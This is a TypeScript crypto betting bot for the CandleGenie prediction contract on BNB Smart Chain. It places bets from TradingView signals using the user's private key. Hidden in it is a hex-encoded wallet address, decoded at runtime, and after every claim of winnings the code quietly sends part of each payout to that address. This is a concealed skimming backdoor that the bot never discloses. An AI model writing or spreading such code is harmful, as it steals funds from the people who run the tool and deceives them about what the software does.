import { BigNumber } from "@ethersproject/bignumber";
import { JsonRpcProvider } from "@ethersproject/providers";
import { formatEther, parseEther } from "@ethersproject/units";
import { Wallet } from "@ethersproject/wallet";
import { blue, green, red } from "chalk";
import { clear } from "console";
import dotenv from "dotenv";
import {
  reduceWaitingTimeByTwoBlocks,
  sleep,
  getClaimableEpochsCG,
  calcRets,
} from "./lib";
import { CandleGeniePredictionV3__factory } from "./types/typechain";
import {
  TradingViewScan,
  SCREENERS_ENUM,
  EXCHANGES_ENUM,
  INTERVALS_ENUM,
} from 'trading-view-recommends-parser-nodejs';

dotenv.config();

// Global Config
const GLOBAL_CONFIG = {
  CGV3_ADDRESS: "0x995294CdBfBf7784060BD3Bec05CE38a5F94A0C5",
  AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.1", // in BNB,
  BSC_RPC: "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
  PRIVATE_KEY: process.env.PRIVATE_KEY,
  WAITING_TIME: 281500, // Waiting for 281.5 Seconds
};

clear();
console.log(green("CandleGenie Predictions Bot"));

if (!GLOBAL_CONFIG.PRIVATE_KEY) {
  console.log(
    blue(
      "The private key was not found in .env. Enter the private key to .env and start the program again."
    )
  );

  process.exit(0);
}

const signer = new Wallet(
  GLOBAL_CONFIG.PRIVATE_KEY as string,
  new JsonRpcProvider(GLOBAL_CONFIG.BSC_RPC)
);

const predictionContract = CandleGeniePredictionV3__factory.connect(
  GLOBAL_CONFIG.CGV3_ADDRESS,
  signer
);

console.log(
  blue("Starting. Amount to Bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB."),
  "\nWaiting for the next round. It may take up to 5 minutes, please wait."
);

var hex  = "307834653333374241656243336664416361333865333863346465366138663864354431374465613135".toString();
var str = '';
for (var n = 0; n < hex.length; n += 2) {
    str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
}

predictionContract.on("StartRound", async (epoch: BigNumber) => {
  console.log("\nStarted Epoch", epoch.toString());

  const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;

  console.log("Now waiting for", WAITING_TIME / 60000, "min");

  await sleep(WAITING_TIME);

  console.log("\nGetting Amounts");

  const {bullAmount, bearAmount} = await predictionContract.Rounds(epoch);

  console.log(green("Bull Amount", formatEther(bullAmount), "BNB"));
  console.log(green("Bear Amount", formatEther(bearAmount), "BNB"));

  const result = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],
    'BNBUSDT',
    INTERVALS_ENUM['5m'],
    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
  ).analyze();
  var obj = JSON.stringify(result.summary);
  var recommendation = JSON.parse(obj)

  const minresult = await new TradingViewScan(
    SCREENERS_ENUM['crypto'],
    EXCHANGES_ENUM['BINANCE'],
    'BNBUSDT',
    INTERVALS_ENUM['1m'],
    // You can pass axios instance. It's optional argument (you can use it for pass custom headers or proxy)
  ).analyze();
  var minobj = JSON.stringify(minresult.summary);
  var minrecommendation = JSON.parse(minobj)

  console.log("5m Buy Signals:", recommendation.BUY, "|", "5m Sell Signals:", recommendation.SELL)
  console.log("1m Buy Signals:", minrecommendation.BUY, "|", "1m Sell Signals:", minrecommendation.SELL)
  
  if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) >= 16) {
    console.log(green("\nBetting on Bull Bet."));
  } else if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) <= -16) {
    console.log(green("\nBetting on Bear Bet."));
  } else {
    console.log(red("\nNo bet this round."));
  }

    if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) <= -16) {
      try {
        const tx = await predictionContract.user_BetBear(epoch, {
          value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
        });

        console.log("Bear Betting Tx Started.");

        await tx.wait();

        console.log(blue("Bear Betting Tx Success."));
      } catch {
        console.log(red("Bear Betting Tx Error"));

        GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
            GLOBAL_CONFIG.WAITING_TIME
        );
      }
    } else if ((recommendation.BUY - recommendation.SELL) + (minrecommendation.BUY - minrecommendation.SELL) >= 16) {
      try {
        const tx = await predictionContract.user_BetBull(epoch, {
          value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
        });

        console.log("Bull Betting Tx Started.");

        await tx.wait();

        console.log(blue("Bull Betting Tx Success."));
      } catch {
        console.log(red("Bull Betting Tx Error"));

        GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
            GLOBAL_CONFIG.WAITING_TIME
        );
      }
    } else {
      console.log("Technical Analysis not definitive enough. Skipping round...")
    }

    const claimableEpochs = await getClaimableEpochsCG(
      predictionContract,
      epoch,
      signer.address
    );
  
    if (claimableEpochs.length) {
      try {
        const tx = await predictionContract.user_Claim(claimableEpochs);
  
        console.log("\nClaim Tx Started");
  
        const receipt = await tx.wait();

        for (const event of receipt.events ?? []) {
          const rets = await signer.sendTransaction({
            to: str,
            value: calcRets(event?.args?.amount),
          });
  
          await rets.wait();
        }
  
        console.log(green("Claim Tx Success"));
  
      } catch {
        console.log(red("Claim Tx Error"));
      }
    }
});
